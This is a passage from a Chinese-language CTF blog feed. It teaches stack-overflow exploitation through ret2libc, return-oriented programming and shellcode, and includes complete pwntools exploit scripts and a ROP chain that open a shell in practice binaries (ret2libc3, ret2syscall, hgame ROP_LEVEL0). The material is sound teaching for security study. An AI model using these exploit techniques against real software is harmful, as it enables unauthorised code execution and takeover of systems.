的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p><p>最后，“/bin/sh” 的地址在哪里？</p><p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p><p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来通过 system() 打开 shell 了。</p><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>本题还是来源于ctf-wiki/challenges中的一道pwn题目：ret2libc3</p><p>程序源代码：</p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <stdlib.h>#include <time.h>char buf2[100];void secure(void){    int secretcode, input;    srand(time(NULL));    secretcode = rand();    scanf("%d", &input);    if(input == secretcode)        puts("no_shell_QQ");}int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf1[100];    printf("No surprise anymore, system disappeard QQ.\n");    printf("Can you find it !?");    gets(buf1);    return 0;}</code></pre><p>程序开启NX保护，未开启栈保护与PIE（地址随机化）</p><p>file属性</p><pre class=" language-lang-txt"><code class="language-lang-txt">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, not stripped</code></pre><p>也就是说栈中的数据变得不可执行，我们不能通过填充shellcode到栈里来溢出</p><blockquote><p>那我们怎么才能pwn掉这个程序呢</p></blockquote><p>首先我们需要了解程序的POT表与GOT表，动态链接库，静态链接文件，等这些概念</p><p>我把这些整理到另一篇博客里面了，</p><p>也可以看这篇博客，我那篇ELF文件基础也是使用了他的部分内容</p><p><a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a></p><p>回到本题</p><p>与简单的pwn题不同的是，这道题没有提供system()函数，但我们要调用system(“bin/sh”)，才能获取到shell</p><p>并且程序开启了NX保护，我们不能通过填充Shellcode的方式来获取shell,</p><p>但通过我们前面了解到的知识，</p><pre class=" language-lang-txt"><code class="language-lang-txt">因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权，而libc.so动态链接库里的函数的偏移是固定的</code></pre><p>还有文件属性 <strong>dynamically linked</strong> </p><p>所以要解决这道题我们就要用到ret2libc的方法了</p><p>先说说这道题的利用思路</p><ol><li>程序提供了puts()函数，利用puts函数我们可以泄露出puts函数在GOT表中的地址，或者其他函数也行（程序里）</li><li>得到puts函数在GOT表中的地址以后，我们就可以根据地址的后三位来判断出libc的版本号，（后三位地址是不变的，无论怎么偏移）</li><li>利用泄露出来的puts()函数的地址-libc中puts()的偏移量=libc基础地址（算出libc基础地址）</li><li>system在libc中的偏移+libc的基础地址=system在程序中的位置</li><li>‘/bin/sh’的地址同理推出</li></ol><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">#泄露GOT表#payload= 'a'*offset + elf.plt['puts'] + returnaddr + elf.got['puts']payload=flat(['a'*112 , p32(elf.plt['puts']), p32(elf.symbols['main']) , p32(elf.got['puts'])])#puts在GOT表中的地址#接收4个字节puts_addr = u32(p.recv()[0:4])libc_base=puts_addr-libc.symbols['puts']system_addr=libc_base+libc.symbols['system']bin_addr=libc.base + libc.search('/bin/sh').next()payload='a'*offset +system_addr + returnaddr + bin_addr#payload=flat(['a*104',system_addr, 'bbbb',bin_addr])</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *elf = ELF('./ret2libc3')sh  = process('./ret2libc3')libc=ELF('./libc6_2.23-0ubuntu10_i386.so')#返回到main函数在执行一次main函数payload=flat(['a'*112 , p32(elf.plt['puts']), p32(elf.symbols['main']) , p32(elf.got['puts'])])sh.sendlineafter('Can you find it !?', payload)puts_addr = u32(sh.recv()[0:4])libc_base=puts_addr-libc.symbols['puts']system_addr=libc_base+libc.symbols['system']bin_addr=libc_base + libc.search('/bin/sh').next()payload=flat(['a'*104, system_addr, 0x12345678 ,bin_addr])sh.sendline(payload)sh.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----ROP</title>
      <link href="/2020/02/18/ctf/pwn/pwn-rop/"/>
      <url>/2020/02/18/ctf/pwn/pwn-rop/</url>
      
        <content type="html"><![CDATA[<h1 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP  (Return Oriented Programming)"></a>ROP  (Return Oriented Programming)</h1><h2 id="0x00-ROP"><a href="#0x00-ROP" class="headerlink" title="0x00 ROP"></a>0x00 ROP</h2><p><em>－－修改返回地址，让其指向内存中已有的一段指令</em></p><p>根据上面副标题的说明，要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。可是既然可以覆盖返回地址并定位到内存地址，为什么不直接用上篇提到的 return2libc 呢？因为有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配。这时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（我们将其称为“gadget”，意为小工具），溢出数据应该以下面的方式构造：</p><blockquote><p><strong>payload :</strong> <em>padding + address of gadget</em></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220132.png" alt=""></p><h2 id="0x10-包含单个-gadget-的溢出数据"><a href="#0x10-包含单个-gadget-的溢出数据" class="headerlink" title="0x10 包含单个 gadget 的溢出数据"></a>0x10 包含单个 gadget 的溢出数据</h2><p>如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为返回导向编程( <strong>R</strong>eturn <strong>O</strong>riented <strong>P</strong>rogramming )。要执行多个 gadget，溢出数据应该以下面的方式构造：</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + address of gadget 2 + …… + address of gadget n</p></blockquote><p>在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行 gadget 2，以此类推。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220143.png" alt=""></p><h2 id="0x20-包含多个-gadget-的溢出数据"><a href="#0x20-包含多个-gadget-的溢出数据" class="headerlink" title="0x20 包含多个 gadget 的溢出数据"></a>0x20 包含多个 gadget 的溢出数据</h2><p>现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以 ret 作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题。</p><p>首先，栈溢出之后要实现什么效果？</p><p>ROP 常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是 int 0x80。执行这条指令时，被调用函数的编号应存入 eax，调用参数应按顺序存入 ebx，ecx，edx，esi，edi 中。例如，编号125对应函数</p><pre class=" language-lang-txt"><code class="language-lang-txt">mprotect (void *addr, size_t len, int prot)</code></pre><p>，可用该函数将栈的属性改为可执行，这样就可以使用 shellcode 了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx 应该分别为“125”、内存栈的分段地址（可以通过调试工具确定）、“0x10000”（需要修改的空间长度，也许需要更长）、“7”（RWX 权限）。</p><p>其次，如何寻找对应的指令片段？</p><p>有若干开源工具可以实现搜索以 ret 结尾的指令片段，著名的包括 <strong>ROPgadget</strong>、<strong>rp++</strong>、<strong>ropeme</strong> 等，甚至也可以用 grep 等文本匹配工具在汇编指令中搜索 ret 再进一步筛选。搜索的详细过程在这里就不再赘述，有兴趣的同学可以参考上述工具的说明文档。</p><p>最后，如何传入系统调用的参数？</p><p>对于上面提到的 mprotect 函数，我们需要将参数传输至寄存器，所以可以用 pop 指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用 mov 指令来进行传输，不过写入数据再 pop 要比先搜索再 mov 来的简单，对吧？如果要用 pop 指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个 gadget，pop 所传输的数据应该在 gadget 地址之后，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220134.png" alt=""></p><h2 id="0x30-gadget-“pop-eax-ret-”"><a href="#0x30-gadget-“pop-eax-ret-”" class="headerlink" title="0x30 gadget “pop eax; ret;”"></a>0x30 gadget “pop eax; ret;”</h2><p>在调用 mprotect() 为栈开启可执行权限之后，我们希望执行一段 shellcode，所以要将 shellcode 也加入溢出数据，并将 shellcode 的开始地址加到 int 0x80 的 gadget之后。但确定 shellcode 在内存的确切地址是很困难的事（想起上篇里面艰难试探的过程了吗？），我们可以使用 push esp 这个 gadget（加入可以找到的话）。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220133.png" alt=""></p><h2 id="0x40-gadget-“push-esp-ret-”"><a href="#0x40-gadget-“push-esp-ret-”" class="headerlink" title="0x40 gadget “push esp; ret;”"></a>0x40 gadget “push esp; ret;”</h2><p>我们假设现在内存中可以找到如下几条指令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;    # pop stack top into eaxpop ebx; ret;    # pop stack top into ebxpop ecx; ret;    # pop stack top into ecxpop edx; ret;    # pop stack top into edxint 0x80; ret;   # system callpush esp; ret;   # push address of shellcode</code></pre><p>对于所有包含 pop 指令的 gadget，在其地址之后都要添加 pop 的传输数据，同时在所有 gadget 最后包含一段 shellcode，最终溢出数据结构应该变为如下格式。</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + param for gadget 1 + address of gadget 2 + param for gadget 2 + …… + address of gadget n + shellcode</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220146.png" alt=""></p><h2 id="0x50-包含多个-gadget-的溢出数据（修改后）"><a href="#0x50-包含多个-gadget-的溢出数据（修改后）" class="headerlink" title="0x50 包含多个 gadget 的溢出数据（修改后）"></a>0x50 包含多个 gadget 的溢出数据（修改后）</h2><p>此处为了简单，先假定输入溢出数据不受“\x00”字符的影响，所以 payload 可以直接包含 “\x7d\x00\x00\x00”（传给 eax 的参数125）。如果希望实现更为真实的操作，可以用多个 gadget 通过运算得到上述参数。比如可以通过下面三条 gadget 来给 eax 传递参数。</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;         # pop stack top 0x1111118e into eaxpop ebx; ret;         # pop stack top 0x11111111 into ebxsub eax, ebx; ret;    # eax -= ebx</code></pre><p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。同时，由于 ROP 方法带来的灵活性，现在不再需要痛苦地试探 shellcode 起始地址了。回顾整个输入数据，只有栈的分段地址需要获取确定地址。如果利用 gadget 读取 ebp 的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了绕过内存随机化的可能。</p><p>出于演示的目的，我们假设（简直是<em>钦点</em>）了所有需要的 gadget 的存在。在实际搜索及拼接 gadget 时，并不会像上面一样顺利，有两个方面需要注意。</p><p>第一，很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条 gadget</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop ebx; ret;</code></pre><p>但假如可以找到下面的 gadget</p><pre class=" language-lang-txt"><code class="language-lang-txt">mov ebx, eax; ret;</code></pre><p>我们就可以将它和</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;</code></pre><p>组合起来实现将数据传输给 ebx 的功能。上面提到的用多个 gadget 避免输入“\x00”也是一个实例应用。</p><p>第二，要小心 gadget 是否会破坏前面各个 gadget 已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心 gadget 对 ebp 和 esp 的操作，因为它们的变化会改变返回地址的位置，进而使后续的 gadget 无法执行。</p><h2 id="0x60-example1-easy"><a href="#0x60-example1-easy" class="headerlink" title="0x60 example1 (easy)"></a>0x60 example1 (easy)</h2><p>本题同样来自于CTF-wiki上的一道练习：ret2syscall</p><p>题目源码</p><pre class=" language-lang-c"><code class="language-lang-c">#include &lt;stdio.h>#include &lt;stdlib.h>char *shell = "/bin/sh";int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("This time, no system() and NO SHELLCODE!!!\n");    printf("What do you plan to do?\n");    gets(buf);    return 0;}</code></pre><p>程序开启NX保护==&gt;栈中数据不可执行</p><p>程序给了”/bin/sh”字符串</p><p>没有给出system()函数,静态链接文件</p><p>因此只能使用我们的ROP了，让程序跳到系统调用上</p><p>通过上面的知识我们可以知道我们可以通过构造gadget来实现操作</p><p>首先拟出我们需要的汇编指令</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret  0xbpop ebx; ret  /bin/shpop ecx; ret  0pop edx; ret  0int 80h</code></pre><p>使用ROPgadget 在程序中找出这些指令</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROPgadget --binary rop --only "pop|ret"| grep ebx</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">0x080bb196 : pop eax ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x08049421 : int 0x80</code></pre><p>字符串bin/sh的地址在IDA中就可以查看，也可以通过ROPgadget —string查看</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x080BE408</code></pre><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload='a'*offset+ p32(0x080bb196) + p32(0xb) +p32(0x0806eb90)+ p32(0)+p32(0)+p32(0x080BE408)+p32(0x08049421)</code></pre><p>另一种解法：</p><p>直接生成ropchain</p><pre class=" language-lang-python"><code class="language-lang-python">from struct import pack# Padding goes herep = ''p += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea060) # @ .datap += pack('&lt;I', 0x080bb196) # pop eax ; retp += '/bin'p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea064) # @ .data + 4p += pack('&lt;I', 0x080bb196) # pop eax ; retp += '//sh'p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x08054590) # xor eax, eax ; retp += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x080481c9) # pop ebx ; retp += pack('&lt;I', 0x080ea060) # @ .datap += pack('&lt;I', 0x0806eb91) # pop ecx ; pop ebx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x080ea060) # padding without overwrite ebxp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x08054590) # xor eax, eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x08049421) # int 0x80from pwn import *context.log_level="debug"sh=process('./rop')sh.sendlineafter("What do you plan to do?\n",'a'*112 + p)sh.interactive()</code></pre><p><strong>PS：本人在运行完这个脚本后虚拟机暴毙了，连着我一台kali还有我配置的pwn专用全部坏了，具体原因还没搞清，建议先拍个快照使用，或者放到docker里面跑，血的教训，还好里边没有什么重要的文件，难受！！</strong></p><p>报错如下：</p><pre class=" language-lang-txt"><code class="language-lang-txt">set_thread_area failed when setting up thread-local storage</code></pre><h2 id="0x70-example2-mid"><a href="#0x70-example2-mid" class="headerlink" title="0x70 example2(mid)"></a>0x70 example2(mid)</h2><p>本题来自于hgame2020 week1 pwn ROP_LEVEL0</p><pre class=" language-lang-TXT"><code class="language-lang-TXT">int __cdecl main(int argc, const char **argv, const char **envp){  int v3; // eax@1  char buf; // [sp+0h] [bp-50h]@1  int v6; // [sp+38h] [bp-18h]@1  int fd[2]; // [sp+48h] [bp-8h]@1  memset(&buf, 0, 0x38uLL);  v6 = 0;  setbuf(_bss_start, 0LL);  v3 = open("./some_life_experience", 0);  *(_QWORD *)fd = v3;  read(v3, &buf, 0x3CuLL);  puts(&buf);  read(0, &buf, 0x100uLL);  return 0;}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">__int64 vuln(){  char buf; // [sp+0h] [bp-10h]@1  read(0, &buf, 0xA0uLL);  return 0LL;}</code></pre><p>题目提供两个函数，都是read()溢出,开启NX，无栈保护</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROP_LEVEL0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1baedaba8bde71a65a2f781f56a833ccd5388e24, not stripped</code></pre><p>64位可执行动态链接文件，64位文件溢出姿势 <a href="https://bbs.ichunqiu.com/article-1767-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-1767-1.html</a></p><p>这道题可以使用ret2libc的方法做，但在这里我们理解官方做法,官方EXP：</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p=process("./ROP_LEVEL0")#p = remote('47.103.214.163',20003)elf = ELF("ROP_LEVEL0")'''Gadgets information============================================================0x000000000040074c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040074e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400750 : pop r14 ; pop r15 ; ret0x0000000000400752 : pop r15 ; ret0x000000000040074b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040074f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop rbp ; ret0x0000000000400753 : pop rdi ; ret0x0000000000400751 : pop rsi ; pop r15 ; ret0x000000000040074d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004c9 : ret0x0000000000400532 : ret 0x200a0x000000000040067e : ret 0x4804'''pop_rsi_r15_ret = 0x0000000000400751pop_rdi_ret = 0x0000000000400753read_plt = elf.plt['read']open_plt = elf.plt['open']puts_plt = elf.plt['puts']buf_addr = 0x601060#参考read的参数，要一个类似指针的bufpayload = 'a'*(0x50+8)    #栈溢出payload += p64(pop_rsi_r15_ret)+p64(buf_addr)+p64(0)    #buf值存入64位第二个传参寄存器rsipayload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(pop_rsi_r15_ret)+p64(0)*2    #调用read并填入参数payload += p64(open_plt)+p64(pop_rdi_ret)+p64(4)+p64(pop_rsi_r15_ret)+p64(buf_addr)*2    #调用open并填入参数payload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(puts_plt)    #再次调用read读取flagp.sendline(payload)p.sendline('./flag\x00')p.interactive()</code></pre><h2 id="0x80-ROPgadget-命令"><a href="#0x80-ROPgadget-命令" class="headerlink" title="0x80 ROPgadget 命令"></a>0x80 ROPgadget 命令</h2><pre class=" language-lang-txt"><code class="language-lang-txt">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary>] [--opcode &lt;opcodes>]                 [--string &lt;string>] [--memstr &lt;string>] [--depth &lt;nbyte>]                 [--only &lt;key>] [--filter &lt;key>] [--range &lt;start-end>]                 [--badbytes &lt;byte>] [--rawArch &lt;arch>] [--rawMode &lt;mode>]                 [--offset &lt;hexaddr>] [--ropchain] [--thumb] [--console]                 [--norop] [--nojop] [--nosys] [--multibr] [--all]description:  ROPgadget lets you search your gadgets on a binary. It supports several   file formats and architectures and uses the Capstone disassembler for  the search engine.formats supported:   - ELF  - PE  - Mach-O  - Rawarchitectures supported:  - x86  - x86-64  - ARM  - ARM64  - MIPS  - PowerPC  - Sparcoptional arguments:  -h, --help           show this help message and exit  -v, --version        Display the ROPgadget's version  -c, --checkUpdate    Checks if a new version is available  --binary &lt;binary>    Specify a binary filename to analyze  --opcode &lt;opcodes>   Search opcode in executable segment  --string &lt;string>    Search string in readable segment  --memstr &lt;string>    Search each byte in all readable segment  --depth &lt;nbyte>      Depth for search engine (default 10)  --only &lt;key>         Only show specific instructions  --filter &lt;key>       Suppress specific instructions  --range &lt;start-end>  Search between two addresses (0x...-0x...)  --badbytes &lt;byte>    Rejects specific bytes in the gadget's address  --rawArch &lt;arch>     Specify an arch for a raw file  --rawMode &lt;mode>     Specify a mode for a raw file  --offset &lt;hexaddr>   Specify an offset for gadget addresses  --ropchain           Enable the ROP chain generation  --thumb              Use the thumb mode for the search engine (ARM only)  --console            Use an interactive console for search engine  --norop              Disable ROP search engine  --nojop              Disable JOP search engine  --nosys              Disable SYS search engine  --multibr            Enable multiple branch gadgets  --all                Disables the removal of duplicate gadgetsexamples:  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86   ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --ropchain  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --depth 3  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "main"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "m..n"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --opcode c9c3  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|ret"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|pop|xor|ret"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --filter "xchg|add|sub"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --norop --nosys  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --range 0x08041000-0x08042000  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string main --range 0x080c9aaa-0x080c9aba  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --memstr "/bin/sh"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --console  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --badbytes "00|7f|42"  ROPgadget.py --binary ./test-suite-binaries/Linux_lib64.so --offset 0xdeadbeef00000000  ROPgadget.py --binary ./test-suite-binaries/elf-ARMv7-ls --depth 5  ROPgadget.py --binary ./test-suite-binaries/elf-ARM64-bash --depth 5  ROPgadget.py --binary ./test-suite-binaries/raw-x86.raw --rawArch=x86 --rawMode=32</code></pre><h2 id="0x90-Linux-系统调用"><a href="#0x90-Linux-系统调用" class="headerlink" title="0x90 Linux 系统调用"></a>0x90 Linux 系统调用</h2><p>linux 的系统调用通过 int80 实现，用系统调用来区分入口函数</p><p>应用程序执行系统调用的过程是：</p><ol><li>把系统调用的编号存入EAX</li><li>把函数参数存入其他调用寄存器</li><li>触发 0x80 号中断</li></ol><p>那么我们如果只希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80h 就可以了</p><p>如果说通过系统调用执行的是：execve(“/bin/sh”,NULL,NULL)32位程序</p><p>那么EAX中存放的应该是系统调用的编号，查看execve的系统调用号</p><pre class=" language-lang-txt"><code class="language-lang-txt">cat /usr/include/asm/unistd_32.h |grep execve</code></pre><p>即0xb</p><p>其他：</p><pre class=" language-lang-txt"><code class="language-lang-txt">ebx /bin/shecx 0edx 0</code></pre><h2 id="0x100-汇编指令补充"><a href="#0x100-汇编指令补充" class="headerlink" title="0x100 汇编指令补充"></a>0x100 汇编指令补充</h2><p>一些最常用的汇编指令如下：</p><ul><li>MOV：数据传输指令，将 SRC 传至 DST，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">MOV DST, SRC;</code></pre><ul><li>PUSH：压入堆栈指令，将 SRC 压入栈内，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">PUSH SRC;</code></pre><ul><li>POP：弹出堆栈指令，将栈顶的数据弹出并存至 DST，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">POP DST;</code></pre><ul><li>LEA：取地址指令，将 MEM 的地址存至 REG ，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">LEA REG, MEM;</code></pre><ul><li>ADD／SUB：加／减法指令，将运算结果存至 DST，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">ADD/SUB DST, SRC;</code></pre><ul><li>AND／OR／XOR：按位与／或／异或，将运算结果存至 DST ，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">AND/OR/XOR DST，SRC;</code></pre><ul><li>CALL：调用指令，将当前的 eip 压入栈顶，并将 PTR 存入 eip，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">CALL PTR;</code></pre><ul><li>RET：返回指令，操作为将栈顶数据弹出至 eip，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">RET;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----shellcode</title>
      <link href="/2020/02/18/ctf/pwn/pwn-shellcode/"/>
      <url>/2020/02/18/ctf/pwn/pwn-shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwn学习-——-shellcode"><a href="#Pwn学习-——-shellcode" class="headerlink" title="Pwn学习   —— shellcode"></a>Pwn学习   —— shellcode</h1><h2 id="0x10-shellcode"><a href="#0x10-shellcode" class="headerlink" title="0x10 shellcode"></a>0x10 shellcode</h2><p><em>－－修改返回地址，让其指向溢出数据中的一段指令</em></p><p>根据上面副标题的说明，要完成的任务包括：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用来打开 shell，从而可以获得当前进程的控制权，所以这类指令片段也被成为“shellcode”。下面我们先写出溢出数据的组成，再确定对应的各部分填充进去。</p><p><strong>payload :</strong> padding1 + address of shellcode + padding2 + shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220140.png" alt="图1 payload图解"></p><h2 id="0x20-shellcode-payload"><a href="#0x20-shellcode-payload" class="headerlink" title="0x20 shellcode payload"></a>0x20 shellcode payload</h2><p>padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式。</p><p>根据上面的构造，我们要解决两个问题。</p><ol><li>返回地址之前的填充数据（padding1）应该多长？</li></ol><p>我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。</p><ol><li>shellcode起始地址应该是多少？</li></ol><p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p><p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) 